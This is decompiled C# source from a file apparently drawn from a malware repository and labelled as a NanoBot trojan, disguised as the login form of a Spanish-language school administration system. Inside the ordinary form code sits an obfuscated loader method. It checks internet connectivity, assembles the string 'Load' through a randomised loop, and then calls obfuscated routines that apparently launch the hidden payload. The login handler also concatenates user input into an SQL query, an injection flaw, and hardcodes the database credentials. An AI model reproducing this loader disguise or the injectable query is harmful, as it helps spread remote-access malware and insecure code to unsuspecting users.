// Decompiled with JetBrains decompiler
// Type: Ar1.Ky4
// Assembly: Gj2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A62A5ADA-7FE4-4EB1-847A-643609D7485F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.NanoBot.gen-0a3044af336b6c7268fe3d1f2fb8ecda2353552bee8455a6285be0a7e55e2d44.exe

using f9BF;
using Jd8;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using z1Q;

namespace Ar1
{
  [DesignerGenerated]
  public class Ky4 : Form
  {
    internal static string[] Listt;
    internal static Dictionary<string, object> mDic;
    internal static string dName;
    internal static string tName;
    internal static string mName;
    internal static string mArray;
    internal static string sArray;
    internal static string T;
    internal static string sNum;
    private IContainer components;

    public Ky4()
    {
      this.Load += new EventHandler(this.Js2);
      this.m2Q();
    }

    private void s7Q(object w7A, EventArgs Pc9)
    {
      MySqlConnection mySqlConnection = new MySqlConnection();
      MySqlCommand mySqlCommand = new MySqlCommand();
      mySqlCommand.Connection = mySqlConnection;
      try
      {
        mySqlConnection.ConnectionString = "Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;";
        mySqlConnection.Open();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message);
        ProjectData.ClearProjectError();
      }
      mySqlCommand.CommandText = "SELECT * FROM usuario WHERE nombre_usuario='" + this.txtUsuario.Text + "'AND password='" + this.txtPassword.Text + "'";
      MySqlDataReader mySqlDataReader = mySqlCommand.ExecuteReader();
      if (mySqlDataReader.HasRows)
      {
        mySqlDataReader.Read();
        this.Timer1.Start();
      }
      else
      {
        int num1 = (int) Interaction.MsgBox((object) "Error, Datos incorrectos");
      }
    }

    [STAThread]
    public static void Np5()
    {
      try
      {
        string[] strArray1 = new string[2]
        {
          "https://www.google.com/",
          "https://www.bing.com/"
        };
        int num = 0;
        while (num != 2)
        {
          string[] strArray2 = strArray1;
          int index = 0;
          while (index < strArray2.Length)
          {
            if (!Rn4.o8PF(strArray2[index]))
            {
              if (num > 0)
                checked { --num; }
              Task.Delay(30000).Wait();
            }
            else
              checked { ++num; }
            checked { ++index; }
          }
        }
        string[] strArray3 = new string[4]
        {
          "L",
          "o",
          "a",
          "d"
        };
        StringBuilder stringBuilder = new StringBuilder();
        while (Operators.CompareString(stringBuilder.ToString(), "Load", false) != 0)
        {
          string Left = strArray3[new Random().Next(0, checked (num + 1))];
          if (Operators.CompareString(stringBuilder.ToString(), (string) null, false) == 0 && Operators.CompareString(Left, "L", false) == 0)
          {
            stringBuilder.Append(Left);
            strArray3 = new string[3]{ "o", "a", "d" };
            num = -1;
          }
          if (Operators.CompareString(stringBuilder.ToString(), "L", false) == 0 && Operators.CompareString(Left, "o", false) == 0)
          {
            stringBuilder.Append(Left);
            strArray3 = new string[2]{ "a", "d" };
            num = -1;
          }
          if (Operators.CompareString(stringBuilder.ToString(), "Lo", false) == 0 && Operators.CompareString(Left, "a", false) == 0)
          {
            stringBuilder.Append(Left);
            strArray3 = new string[1]{ "d" };
            num = -1;
          }
          if (Operators.CompareString(stringBuilder.ToString(), "Loa", false) == 0 && Operators.CompareString(Left, "d", false) == 0)
            stringBuilder.Append(Left);
        }
        if (num != -1)
          return;
        Rn4.g7E9(checked (num + 2));
        Sd78.Fj4q();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Xo5(object Ea8, EventArgs Ke3)
    {
      if (this.cbMostrarContra.Checked)
        this.txtPassword.UseSystemPasswordChar = false;
      else
        this.txtPassword.UseSystemPasswordChar = true;
    }

    private void Jm5(object Md8, EventArgs f6H)
    {
      this.ProgressBar1.Increment(5);
      if (this.ProgressBar1.Value != 100)
        return;
      this.Timer1.Enabled = false;
      this.Hide();
      int num = (int) Interaction.MsgBox((object) ("Bienvenido al Sistema: " + this.txtUsuario.Text));
      Kr0.Forms.FrmPrincipal.Show();
    }

    private void Js2(object Km8, EventArgs Yq7)
    {
    }

    [DebuggerNonUserCode]
    protected virtual void Db2(bool Yo8)
    {
      try
      {
        if (!Yo8 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Yo8);
      }
    }

    [DebuggerStepThrough]
    private void m2Q()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Ky4));
      this.Panel1 = new Panel();
      this.ProgressBar1 = new ProgressBar();
      this.cbMostrarContra = new CheckBox();
      this.btnIngresar = new Button();
      this.txtPassword = new TextBox();
      this.txtUsuario = new TextBox();
      this.Label2 = new Label();
      this.lblUsuario = new Label();
      this.Label1 = new Label();
      this.Timer1 = new Timer(this.components);
      this.Panel1.SuspendLayout();
      this.SuspendLayout();
      this.Panel1.BackColor = Color.Transparent;
      this.Panel1.BackgroundImage = (Image) componentResourceManager.GetObject("Panel1.BackgroundImage");
      this.Panel1.BackgroundImageLayout = ImageLayout.Stretch;
      this.Panel1.Controls.Add((Control) this.ProgressBar1);
      this.Panel1.Controls.Add((Control) this.cbMostrarContra);
      this.Panel1.Controls.Add((Control) this.btnIngresar);
      this.Panel1.Controls.Add((Control) this.txtPassword);
      this.Panel1.Controls.Add((Control) this.txtUsuario);
      this.Panel1.Controls.Add((Control) this.Label2);
      this.Panel1.Controls.Add((Control) this.lblUsuario);
      this.Panel1.Location = new Point(159, 68);
      this.Panel1.Name = "Panel1";
      this.Panel1.Size = new Size(514, 515);
      this.Panel1.TabIndex = 0;
      this.ProgressBar1.Location = new Point(90, 433);
      this.ProgressBar1.Name = "ProgressBar1";
      this.ProgressBar1.Size = new Size(329, 19);
      this.ProgressBar1.TabIndex = 6;
      this.cbMostrarContra.AutoSize = true;
      this.cbMostrarContra.Font = new Font("Microsoft Sans Serif", 9.749999f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cbMostrarContra.Location = new Point(283, 116);
      this.cbMostrarContra.Name = "cbMostrarContra";
      this.cbMostrarContra.Size = new Size(144, 20);
      this.cbMostrarContra.TabIndex = 5;
      this.cbMostrarContra.Text = "Mostrar Contraseña";
      this.cbMostrarContra.UseVisualStyleBackColor = true;
      this.btnIngresar.BackColor = SystemColors.Highlight;
      this.btnIngresar.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnIngresar.Location = new Point(217, 374);
      this.btnIngresar.Name = "btnIngresar";
      this.btnIngresar.Size = new Size(99, 43);
      this.btnIngresar.TabIndex = 4;
      this.btnIngresar.Text = "Ingresar";
      this.btnIngresar.UseVisualStyleBackColor = false;
      this.txtPassword.Location = new Point(262, 90);
      this.txtPassword.Name = "txtPassword";
      this.txtPassword.Size = new Size(137, 20);
      this.txtPassword.TabIndex = 3;
      this.txtPassword.UseSystemPasswordChar = true;
      this.txtUsuario.Location = new Point(262, 52);
      this.txtUsuario.Name = "txtUsuario";
      this.txtUsuario.Size = new Size(137, 20);
      this.txtUsuario.TabIndex = 2;
      this.Label2.AutoSize = true;
      this.Label2.BorderStyle = BorderStyle.FixedSingle;
      this.Label2.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label2.ForeColor = SystemColors.ButtonHighlight;
      this.Label2.Location = new Point(154, 86);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(113, 26);
      this.Label2.TabIndex = 1;
      this.Label2.Text = "Contraseña:";
      this.lblUsuario.AutoSize = true;
      this.lblUsuario.BorderStyle = BorderStyle.FixedSingle;
      this.lblUsuario.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lblUsuario.ForeColor = SystemColors.ButtonHighlight;
      this.lblUsuario.Location = new Point(153, 48);
      this.lblUsuario.Name = "lblUsuario";
      this.lblUsuario.Size = new Size(81, 26);
      this.lblUsuario.TabIndex = 0;
      this.lblUsuario.Text = "Usuario:";
      this.Label1.AutoSize = true;
      this.Label1.BackColor = Color.Transparent;
      this.Label1.Font = new Font("Arial Rounded MT Bold", 26.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.Location = new Point(54, 9);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(671, 40);
      this.Label1.TabIndex = 1;
      this.Label1.Text = "SISTEMA ADMINISTRATIVO ESCOLAR";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.Highlight;
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(794, 611);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.Panel1);
      this.Name = "FrmLogin";
      this.Text = "Login Principal";
      this.Panel1.ResumeLayout(false);
      this.Panel1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button btnIngresar
    {
      get => this._btnIngresar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.s7Q);
        Button btnIngresar1 = this._btnIngresar;
        if (btnIngresar1 != null)
          btnIngresar1.Click -= eventHandler;
        this._btnIngresar = value;
        Button btnIngresar2 = this._btnIngresar;
        if (btnIngresar2 == null)
          return;
        btnIngresar2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("txtPassword")]
    internal virtual TextBox txtPassword { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtUsuario")]
    internal virtual TextBox txtUsuario { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblUsuario")]
    internal virtual Label lblUsuario { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual CheckBox cbMostrarContra
    {
      get => this._cbMostrarContra;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Xo5);
        CheckBox cbMostrarContra1 = this._cbMostrarContra;
        if (cbMostrarContra1 != null)
          cbMostrarContra1.CheckedChanged -= eventHandler;
        this._cbMostrarContra = value;
        CheckBox cbMostrarContra2 = this._cbMostrarContra;
        if (cbMostrarContra2 == null)
          return;
        cbMostrarContra2.CheckedChanged += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProgressBar1")]
    internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Jm5);
        Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Panel1")]
    protected virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    static void Ar6()
    {
      // ISSUE: unable to decompile the method.
    }

    internal delegate void Hd1();
  }
}
